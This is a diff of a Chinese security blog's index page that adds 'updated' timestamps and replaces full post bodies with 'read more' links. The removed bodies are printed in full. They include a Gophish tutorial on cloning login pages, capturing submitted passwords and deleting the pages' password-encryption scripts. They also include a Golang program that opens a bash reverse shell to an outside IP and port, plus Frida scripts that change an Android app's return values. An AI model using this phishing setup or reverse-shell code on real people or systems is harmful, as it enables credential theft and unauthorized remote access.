@@ -258,9 +258,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:28:03 / 修改时间：11:38:01" itemprop="dateCreated datePublished" datetime="2024-09-10T11:28:03+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:28:03" itemprop="dateCreated datePublished" datetime="2024-09-10T11:28:03+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:19:16" itemprop="dateModified" datetime="2024-10-10T18:19:16+08:00">2024-10-10</time>
     </span>
 
   
@@ -273,29 +279,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>我们这里只配置了SMTP（只能发送邮件不能接收）</p>
-</blockquote>
-<h3 id="0x1-环境"><a href="#0x1-环境" class="headerlink" title="0x1 环境"></a>0x1 环境</h3><ul>
-<li>centos 7</li>
-<li>postfix</li>
-</ul>
-<h3 id="0x2-安装"><a href="#0x2-安装" class="headerlink" title="0x2 安装"></a>0x2 安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install postfix</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x3-配置"><a href="#0x3-配置" class="headerlink" title="0x3 配置"></a>0x3 配置</h3><h4 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost~]# hostnamectl set-hostname mail.xxxx.com</span><br><span class="line">[root@localhost~]# exec bash</span><br><span class="line">[root@mail.xxxx.com ~]#</span><br></pre></td></tr></table></figure>
-<h4 id="启动并启用-Postfix-服务"><a href="#启动并启用-Postfix-服务" class="headerlink" title="启动并启用 Postfix 服务"></a>启动并启用 Postfix 服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># service postfix restart</span><br><span class="line"># service postfix restart</span><br><span class="line">或</span><br><span class="line"># systemctl start postfix</span><br><span class="line"># systemctl enable postfix</span><br></pre></td></tr></table></figure>
-
-<h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 75行: 取消注释，设置hostname </span><br><span class="line">myhostname = mail.xxxx.com </span><br><span class="line"># 83行: 取消注释，设置域名 </span><br><span class="line">mydomain = xxxx.com </span><br><span class="line"># 99行: 取消注释 </span><br><span class="line">myorigin = $mydomain </span><br><span class="line"># 116行: 默认是localhost，我们需要修改成all</span><br><span class="line">inet_interfaces = all </span><br><span class="line"># 119行: 推荐ipv4，如果支持ipv6，则可以为all </span><br><span class="line">inet_protocols = ipv4 </span><br><span class="line"># 164行: 添加 </span><br><span class="line">mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain </span><br><span class="line"># 264行: 取消注释，指定内网和本地的IP地址范围 </span><br><span class="line">mynetworks = 127.0.0.0/8</span><br><span class="line"># 419行: 取消注释，邮件保存目录</span><br><span class="line"> home_mailbox = Maildir/ </span><br></pre></td></tr></table></figure>
-
-<p>配置好后重启一下服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># service postfix restart</span><br></pre></td></tr></table></figure>
-
-<h4 id="测试发件"><a href="#测试发件" class="headerlink" title="测试发件"></a>测试发件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;email content&quot; | mail -s &quot;title&quot; test@xxxx.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/images/blog/8364bf3367b4d169d0bae4420211628d.png"></p>
-<blockquote>
-<p>注意如下要更换发件人，需要在系统先创建用户,如：<br>useradd -m -s &#x2F;bin&#x2F;bash master<br>passwd master</p>
-</blockquote>
-
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -349,9 +341,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:26:55 / 修改时间：11:43:52" itemprop="dateCreated datePublished" datetime="2024-09-10T11:26:55+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:26:55" itemprop="dateCreated datePublished" datetime="2024-09-10T11:26:55+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:35" itemprop="dateModified" datetime="2024-10-10T18:17:35+08:00">2024-10-10</time>
     </span>
 
   
@@ -364,62 +362,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>邮件服务器搭建请看另一篇:<a target="_blank" rel="noopener" href="http://42.193.253.66:3000/shareview?key=7ac61948c55d9dd575953a0b8f07849b">邮件服务器搭建</a></p>
-</blockquote>
-<h3 id="0x1-下载"><a href="#0x1-下载" class="headerlink" title="0x1 下载"></a>0x1 下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gophish/gophish</span><br><span class="line">https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="0x2-安装"><a href="#0x2-安装" class="headerlink" title="0x2 安装"></a>0x2 安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">[root@localhost ~]# unzip gophish-v0.11.0-linux-64bit.zip</span><br></pre></td></tr></table></figure>
-<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>监听设置为0.0.0.0意思是监听本机中所有IP的端口，127.0.0.1只能本机访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;admin_server&quot;: &#123;</span><br><span class="line">                &quot;listen_url&quot;: &quot;0.0.0.0:443&quot;,</span><br><span class="line">                &quot;use_tls&quot;: true,</span><br><span class="line">                &quot;cert_path&quot;: &quot;gophish_admin.crt&quot;,</span><br><span class="line">                &quot;key_path&quot;: &quot;gophish_admin.key&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;phish_server&quot;: &#123;</span><br><span class="line">                &quot;listen_url&quot;: &quot;0.0.0.0:80&quot;,</span><br><span class="line">                &quot;use_tls&quot;: false,</span><br><span class="line">                &quot;cert_path&quot;: &quot;example.crt&quot;,</span><br><span class="line">                &quot;key_path&quot;: &quot;example.key&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;db_name&quot;: &quot;sqlite3&quot;,</span><br><span class="line">        &quot;db_path&quot;: &quot;gophish.db&quot;,</span><br><span class="line">        &quot;migrations_prefix&quot;: &quot;db/db_&quot;,</span><br><span class="line">        &quot;contact_address&quot;: &quot;&quot;,</span><br><span class="line">        &quot;logging&quot;: &#123;</span><br><span class="line">                &quot;filename&quot;: &quot;&quot;,</span><br><span class="line">                &quot;level&quot;: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p> listen_url为后续放到钓鱼邮件里的链接</p>
-</blockquote>
-<p>更新gophish权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhsot gophish]# chmod +x gophish</span><br></pre></td></tr></table></figure>
-
-<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./gophish &amp;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x3-功能介绍"><a href="#0x3-功能介绍" class="headerlink" title="0x3 功能介绍"></a>0x3 功能介绍</h3><h4 id="功能界面"><a href="#功能界面" class="headerlink" title="功能界面"></a>功能界面</h4><p><img src="/images/blog/d39cccba83cdbe01f572336751cebbd8.png"></p>
-<h4 id="菜单说明"><a href="#菜单说明" class="headerlink" title="菜单说明"></a>菜单说明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Sending Profiles        发件策略</span><br><span class="line">Campaigns               工作面板</span><br><span class="line">Users &amp; Groups          用户配置--配置收件人</span><br><span class="line">Email Templates         邮件模板--邮件内容设置</span><br><span class="line">Landing Pages           钓鱼页面</span><br><span class="line">Sending Profiles        邮箱发件配置</span><br><span class="line">Account Settings        账户设置</span><br><span class="line">User ManagementAdmin    用户设置--配置后台可登录的用户</span><br><span class="line">WebhooksAdmin           个人暂时不涉及</span><br><span class="line">User Guide</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x4-实战"><a href="#0x4-实战" class="headerlink" title="0x4 实战"></a>0x4 实战</h3><h4 id="发送人信息配置"><a href="#发送人信息配置" class="headerlink" title="发送人信息配置"></a>发送人信息配置</h4><p><img src="/images/blog/4bee75798455f7e6727590b18fba1392.png"></p>
-<blockquote>
-<p>1.因为我的邮件服务器和gophish是放在一台服务器，所以Host填的localhost:25<br>2.Email Headers 可以自定义，默认的话会带有gophish的关键字,可添加【X-Mailer】更改默认值</p>
-</blockquote>
-<h4 id="邮件模板配置【Sending-Profiles】"><a href="#邮件模板配置【Sending-Profiles】" class="headerlink" title="邮件模板配置【Sending Profiles】"></a>邮件模板配置【Sending Profiles】</h4><blockquote>
-<p>邮件模板请参考另一篇</p>
-</blockquote>
-<blockquote>
-<p>注意其中的  .URL  参数，这是一个占位符，邮件实际发出后，会插入钓鱼的链接</p>
-</blockquote>
-<h4 id="收件人配置"><a href="#收件人配置" class="headerlink" title="收件人配置"></a>收件人配置</h4><p>可批量添加【<strong>Bulk Import Users</strong>】，<strong>first name</strong> 和 <strong>Last name</strong>可不填，不影响，在<strong>Email</strong>填入收件人的邮箱即可，好了之后点击【Add】<br><img src="/images/blog/b51c59e575cbfd6803ae70a74332b78b.png"></p>
-<h4 id="钓鱼页面配置"><a href="#钓鱼页面配置" class="headerlink" title="钓鱼页面配置"></a>钓鱼页面配置</h4><p><img src="/images/blog/226e6057092e1590a2b659308a46d14a.png"></p>
-<p>可直接克隆站点【Import Site】，如果需要抓取账号密码的话，把【Capture Submitted Data 】勾选。<br>在用户点击提交按钮后想跳转的话在【Redirect to】填入要跳转的URL</p>
-<blockquote>
-<p>这里需要注意的是，如果想要跳转必须是标准的form表单格式,表单（POST方式）— Input标签（具有name属性）Input标签（submit类型）,如果不是则无法捕获数据，且重定向也会有问题。样式如下</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; ···&gt;</span><br><span class="line">  &lt;input name=&quot;username&quot; ··· /&gt; </span><br><span class="line">  &lt;input name=&quot;password&quot; ··· /&gt; </span><br><span class="line">  &lt;input type=&quot;submit&quot; ··· /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="钓鱼工作面板配置-发送钓鱼邮件"><a href="#钓鱼工作面板配置-发送钓鱼邮件" class="headerlink" title="钓鱼工作面板配置&amp;发送钓鱼邮件"></a>钓鱼工作面板配置&amp;发送钓鱼邮件</h4><p><img src="/images/blog/45f566b8c7b44bdc9bf2f352ebc5a69f.png"><br>释意如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Name:			项目名称</span><br><span class="line">Email Template:		使用哪个邮件模板</span><br><span class="line">Landing Page:		使用哪个钓鱼页面</span><br><span class="line">URL: 			钓鱼页面URL---就是我们上面配置的【listen_url】配置是0.0.0.0:80，这里填入公网的IP和端口【http://公网IP:80】</span><br><span class="line">Launch Date		什么时候发送</span><br><span class="line">Sending Profile:	谁来发送</span><br><span class="line">Groups:			发送给谁</span><br></pre></td></tr></table></figure>
-<p>收到的邮件信息如下：<br><img src="/images/blog/e8f3b4d3c493528f4177f02ca52653ff.png"></p>
-<p>点击如下图标，可查看此工程详细信息<br><img src="/images/blog/178ba2b42eade914f80394ec4304c4cb.png"></p>
-<p><img src="/images/blog/d52cba7a769b0c1dfa0a6bcc7c712fe3.png"></p>
-<p>展开详细信息页面可以看到捕获到的用户填写的信息<br><img src="/images/blog/aca2fe8b6204de037c0540e82a354cb6.png"></p>
-<p>0x5 其它注意事项</p>
-<ul>
-<li>【捕获不到提交的数据】在满足第2点的结构的情况下，还需要求&lt;form method&#x3D;”post” ···&gt;在浏览器解析渲染后（即预览情况下）不能包含action属性，或者action属性的值为空。</li>
-</ul>
-<p>否则将会把表单数据提交给action指定的页面，而导致无法被捕获到 。</p>
-<ul>
-<li><p>【捕获数据不齐全】对于需要被捕获的表单数据，除了input标签需要被包含在中，还需满足该存在name属性。例如&lt;input name&#x3D;”username”&gt;,否则会因为没有字段名而导致value被忽略 。</p>
-</li>
-<li><p>【密码被加密】针对https页面的import，通常密码会进行加密处理，这时需要通过审计导入的前端代码，找到加密的JavaScript函数（多数情况存在于单独的js文件中，通过src引入），将其在gophish的HTML编辑框中删除，阻止表单数据被加密 。<br>以上5点是在实践中总结出来的宝贵经验，或许还有其他许多坑未填，但所有的坑通常都围绕在&lt;form&gt;&lt;input &#x2F;&gt;</form>结构中，所以如果遇到新坑，先将该结构排查一遍，还是不行，再另辟蹊径。</p>
-</li>
-</ul>
-
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/Gophish%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -473,9 +424,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:25:36 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T11:25:36+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:25:36" itemprop="dateCreated datePublished" datetime="2024-09-10T11:25:36+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:37" itemprop="dateModified" datetime="2024-10-10T18:17:37+08:00">2024-10-10</time>
     </span>
 
   
@@ -488,7 +445,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;fmt&quot;</span><br><span class="line">  &quot;os/exec&quot;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    cmd := exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/12.33.22.33/7586 0&gt;&amp;1 &quot; ) </span><br><span class="line">    out, err := cmd.Output()  </span><br><span class="line">    if err != nil &#123;  </span><br><span class="line">        fmt.Println(err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    fmt.Println(string(out))  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/golang%E5%8F%8D%E5%BC%B9shell%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -542,9 +507,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:25:16 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T11:25:16+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:25:16" itemprop="dateCreated datePublished" datetime="2024-09-10T11:25:16+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:40" itemprop="dateModified" datetime="2024-10-10T18:17:40+08:00">2024-10-10</time>
     </span>
 
   
@@ -557,7 +528,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="1-修改返回值"><a href="#1-修改返回值" class="headerlink" title="1.修改返回值"></a>1.修改返回值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">	var utils = Java.use(&quot;com.galaxylab.countdown.MainActivity&quot;);</span><br><span class="line">	utils.getBeg.overload().implementation = function()&#123;</span><br><span class="line">	  var res = this.getBeg()</span><br><span class="line">	  send(&quot;原值：&quot;+res)</span><br><span class="line">	  send(&quot;Hook Start...&quot;);</span><br><span class="line">	  send(&quot;返回 21204&quot;);</span><br><span class="line">	  return res;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/frida%E9%87%8D%E6%8B%BE%E4%B9%8Bhook%E8%84%9A%E6%9C%AC-%E4%BA%8C/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -611,9 +590,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:24:33 / 修改时间：11:46:57" itemprop="dateCreated datePublished" datetime="2024-09-10T11:24:33+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:24:33" itemprop="dateCreated datePublished" datetime="2024-09-10T11:24:33+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:39" itemprop="dateModified" datetime="2024-10-10T18:17:39+08:00">2024-10-10</time>
     </span>
 
   
@@ -626,41 +611,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3.11</span><br><span class="line">雷神模拟器</span><br><span class="line">windows 11</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="2-frida安装"><a href="#2-frida安装" class="headerlink" title="2.frida安装"></a>2.frida安装</h3><p>使用国内镜像加速<br>pip安装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip install frida-tools -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-<p>linux安装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install frida</span><br><span class="line">sudo apt install frida-tools</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>这里需要注意的是windows下安装好后不会添加到环境变量，需要手动添加</p>
-</blockquote>
-<p>下载frida-server到本地<br>选择对应的版本即可，这里我们下载android的x86-64的版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frida/frida/releases</span><br></pre></td></tr></table></figure>
-<p><img src="/images/blog/d1df7766a7ca634731dfec2aa3337a9c.png"></p>
-<h3 id="3-android环境准备"><a href="#3-android环境准备" class="headerlink" title="3.android环境准备"></a>3.android环境准备</h3><p>安装adb<br>windows </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载安装adb</span><br></pre></td></tr></table></figure>
-<p>linux</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install adb</span><br></pre></td></tr></table></figure>
-
-<p>把frida-server上传到模拟器里，运行，并转发端口到本地</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb shell /data/local/tmp/frida-server</span><br></pre></td></tr></table></figure>
-
-<p>然后测试一下是否成功</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/blog/081e83f79baa284212b462f742d4f939.png"></p>
-<h3 id="4-hook测试"><a href="#4-hook测试" class="headerlink" title="4.hook测试"></a>4.hook测试</h3><p>有如下代码，我们让getBeb返回一个较小的值即可让条件满足。<br><img src="/images/blog/9ef6cead0a95f6883f63d2278573eebf.png"></p>
-<p>代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">	var utils = Java.use(&quot;com.galaxylab.countdown.MainActivity&quot;);</span><br><span class="line">	utils.getBeg.overload().implementation = function()&#123;</span><br><span class="line">	  send(&quot;Hook Start...&quot;);</span><br><span class="line">	  send(&quot;返回 21204&quot;);</span><br><span class="line">	  return 21204;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
-
-<p>最后运行如下命令看下,成功运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.galaxylab.countdown -l hook.js</span><br></pre></td></tr></table></figure>
-<p><img src="/images/blog/b98702f5d8d02436780a206bd6909b36.png"></p>
-<h3 id="5-python运行"><a href="#5-python运行" class="headerlink" title="5.python运行"></a>5.python运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import frida</span><br><span class="line">#process_name = &#x27;infosecadventures.fridademo&#x27;</span><br><span class="line">process_name = &#x27;com.galaxylab.countdown&#x27;</span><br><span class="line">#process_name = 20035</span><br><span class="line"># 发送信息回调函数</span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(f&quot;[*] &#123;message[&#x27;payload&#x27;]&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        device = frida.get_usb_device(timeout=1000)</span><br><span class="line">        print(&quot;* get usb device成功&quot;)</span><br><span class="line">    except:</span><br><span class="line">        device = frida.get_remote_device(timeout=1000)</span><br><span class="line">        print(&quot;* get remote device成功&quot;)</span><br><span class="line">    if not device:</span><br><span class="line">        print(&quot;* 连接到Frida Server失败&quot;)</span><br><span class="line">    else:</span><br><span class="line">        # process = device.attach(process_name)</span><br><span class="line">        pid = device.spawn([process_name])</span><br><span class="line">        device.resume(pid)</span><br><span class="line">        time.sleep(1) </span><br><span class="line">        process = device.attach(pid)</span><br><span class="line">        # 加载JS脚本</span><br><span class="line">        js = open(&#x27;hook.js&#x27;, encoding=&#x27;utf-8&#x27;).read()</span><br><span class="line">        script = process.create_script(js)</span><br><span class="line">        script.on(&#x27;message&#x27;, on_message)</span><br><span class="line">        script.load()</span><br><span class="line">        # 读取返回输入</span><br><span class="line">        input()</span><br><span class="line">        script.unload()</span><br></pre></td></tr></table></figure>
-<p><img src="/images/blog/6c861bf0f452cd9d9801e200fa608897.png"></p>
-
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/frida%E9%87%8D%E6%8B%BE%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94android%E6%B5%8B%E8%AF%95%EF%BC%881%EF%BC%89/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -714,9 +673,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:22:58 / 修改时间：11:23:03" itemprop="dateCreated datePublished" datetime="2024-09-10T11:22:58+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:22:58" itemprop="dateCreated datePublished" datetime="2024-09-10T11:22:58+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:19:16" itemprop="dateModified" datetime="2024-10-10T18:19:16+08:00">2024-10-10</time>
     </span>
 
   
@@ -729,7 +694,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
